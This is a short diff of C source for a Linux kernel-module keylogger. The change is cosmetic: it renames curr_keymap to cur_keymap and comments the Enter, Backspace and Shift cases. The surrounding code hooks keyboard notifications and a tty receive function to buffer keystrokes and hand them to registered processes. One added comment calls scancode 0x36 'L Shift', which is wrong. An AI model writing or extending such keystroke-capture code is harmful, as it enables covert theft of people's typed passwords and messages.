@@ -49,7 +49,7 @@ static int cur_ttybuf_length = 0;
 static pid_t registered_pids[MAX_REGISTERED_PROCS];
 static int registered_proc_count = 0;
 
-static char **curr_keymap = KEYMAP;
+static char **cur_keymap = KEYMAP;
 
 static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                         char *fp, int count);
@@ -312,7 +312,7 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
 
         if ( param->down && registered_proc_count ) {
             if ( num_keys_logged < MAX_KEYS_TO_BUFFER ) {
-                key_name = curr_keymap[param->value];
+                key_name = cur_keymap[param->value];
                 name_len = strlen( key_name );
                 next_key = &key_buffer[num_keys_logged];
 
@@ -336,23 +336,23 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
 
 static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
     switch ( keycode ) {
-    case 0x1C:
+    case 0x1C: // Enter key
         if ( down ) {
             SendKey();
         }
         return 1;
-    case 0x0E:
+    case 0x0E: // Backspace
         if ( down && num_keys_logged > 0 ) {
             free_key( &key_buffer[num_keys_logged - 1] );
             num_keys_logged--;
         }
         return 1;
-    case 0x2A:
-    case 0x36:
+    case 0x2A: // Shift
+    case 0x36: // L Shift
         if ( down ) {
-            curr_keymap = SHIFT_KEYMAP;
+            cur_keymap = SHIFT_KEYMAP;
         } else {
-            curr_keymap = KEYMAP;
+            cur_keymap = KEYMAP;
         }
         return 1;
     }
